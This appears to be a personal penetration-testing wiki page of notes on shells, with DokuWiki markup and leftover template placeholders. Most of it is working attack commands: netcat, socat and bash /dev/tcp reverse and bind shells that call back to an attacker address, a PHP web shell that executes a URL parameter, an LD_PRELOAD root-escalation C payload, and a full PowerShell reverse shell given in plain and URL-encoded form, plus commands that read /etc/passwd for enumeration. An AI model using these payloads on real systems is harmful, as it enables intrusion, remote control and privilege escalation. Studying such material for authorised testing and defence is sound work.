===== Shells =====

==== Shell Types ====
description
Reverse shells
target is forced to execute code that connects back to your computer
good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target
need to configure your own network to accept the shell
<code>sudo ufw allow from <IP></code>
example
On local host
<code>sudo nc -lvnp 443</code>
On Target
<code>nc <HOST-IP> <PORT> -e /bin/bash</code>

Bind shells
the code executed on the target is used to start a listener attached to a shell directly on the target
can connect to the port that the code has opened and obtain remote code execution that way.
no configuration on your own network
may be blocked by firewalls on the target

Start a listener on the target and execute cmd.exe
<code>
nc -lvnp <port> -e "cmd.exe"
</code> 
Connect from local host to the port
<code>nc TARGET_IP <port></code>


=== Interactive vs nonInteracive ===
Non-Interactive: limited to using programs which do not require user interaction
Interactive: Any CLI environment like bash, Powershell, sh, etc.

==== Tools ====

=== Netcat ===

Netcat: "Swiss Army Knife" of networking. 
can be used to receive reverse shells
connect to remote ports attached to bind shells on a target system
shell is very unstable by default but can be improved 

 use netcat as a listener for a bindshell,
 In some versions of netcat there is a -e option which allows execution of a process on connection.
 - Windows version included with Kali at /usr/share/windows-resources/binaries
 - Kali supported, and the version used in Kali itself: netcat-traditional) th
<code>
nc -lvnp <PORT> -e /bin/bash
</code>

not included in most versions of netcat
Can work around that

<code>
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
</code>
Explanation
create a named pipe <code>mkfifo /tmp/f;</code>
Start netcat listener <code>nc -lvnp <PORT></code>
connect listener input to named pipe <code>< /tmp/f</code>
Output of netcat listener to into sh <code> | /bin/sh >/tmp/f </code>
sent stderr out to stdout <code>2>&1;</code>
send stdout to named pipe??? <code> rm /tmp/f</code>

similar command can be used to send a netcat reverse shell:
<code>
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
</code>



=== Socat ===
Socat: Like netcat but more powerful. 
shells are usually more stable than netcat shells out of the box.
 - The syntax is more difficult
 - very rarely installed by default


Set up a reverse shell listener
<code>
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
</code>

This sets up an OPENSSL listener using our generated certificate. verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.

Connect back
<code>
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
</code>

Bind shell:

Target:

</code>
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
</code>

Attacker:
''
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
</code>

<code>
code blocks
</code> 

=== Upgrade Shell ===

Three Parts
1
description Python - spawn a bash shell
may need the version of Python specified
<code>
 python -c 'import pty;pty.spawn("/bin/bash")'; 
</code> 

2
description  get access to term commands such as clear

<code>
export TERM=xterm
</code> 

description Background the shell
<code>
 Ctrl + Z
</code> 

Conect back terminal
<code>
stty raw -echo; fg
</code>
 - turns off our local terminal echo
    - access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes), etc,
 - foregrounds the shell

<note>if the shell dies any input in the local terminal will not be visible
To fix:
<code>reset</code>
</note>

=== Bash ===

Add to crontab
<code>#!/bin/bash</code>

<code>bash -i >& /dev/tcp/<local IP>/<port> 0>&1</code>
example
<code>bash -i >& /dev/tcp/10.13.26.131/4242 0>&1</code>


=== Metasploit -- multi/handler ===

Used to receive reverse shells.
obtains stable shells



==== web shells ====
description - upload in some form or fashion and exe
script runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server.
In Kali at /usr/share/webshells
    Best PentestMonkey php-reverse-shell
        a full reverse shell written in PHP.
Most generic, language specific like PHP reverse shells are written for Unix based targets such as Linux webservers and won't work on M$

=== linux ====
PHP
takes a GET parameter in the URL and executes it on the system with shell_exec()
any commands after ?cmd= will be executed on the system (MS or nix)
<code><pre> </code> are for formatting
<code>
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
</code> 
<?php echo "<pre>" . shell_exec($_GET["cmd=ifconfig"]) . "</pre>"; ?>

. Essentially, what this means is that any commands we enter in the URL after ?cmd= will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.

Simple C script (named pwned.c)
<code>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
</code>

Complile it as shared object

<code>gcc -fPIC -pwnwd -o pwnwd.so pwnwd.c -nostartfiles</code>

Run the program using LD_PRELOAD
<code>sudo LD_PRELOAD=<full path>/pwnwd.so find</code>

=== Windows ===
easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell
 obtaining RCE is often done with a URL Encoded Powershell Reverse Shell
Example
Original
<code>
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0<code>65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
</code>
URL Encoded
<code>
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200<code>65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
</code>

=== SSH Shells ===

<code>ssh username@host</code>

Show info, path might show things like Python
<code>env</code>

show commands current user can run as 'sudo <cmd>'
<code>sudo -l</code>

Look for users in /etc/passwd and
<code>cat/etc/passwd</code>

see what those users can do
<code>uid <username</code> 


cut output for username list
<code>cat /etc/passwd | cut -d ":" -f 1</code>

same but users with a home directory
<code>cat /etc/passwd | grep home | cut -d ":" -f 1</code>

Find OS short version like "Ubuntu 20.04 LTS"
<code>cat /etc/issue</code>

Kernel version
<code>uname -r</code>

Find out current user can run
<code>sudo -l</code>

=== NFS ===

<code>showmount -e</code>

==== Resources ====
Kali Linux -  /usr/share/webshells
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
normally wordlsits but also shells
https://github.com/danielmiessler/SecLists

=== topic name ===
description
<code>
code blocks
</code> 


{{tag>tag1, tag2, "tag 3"}
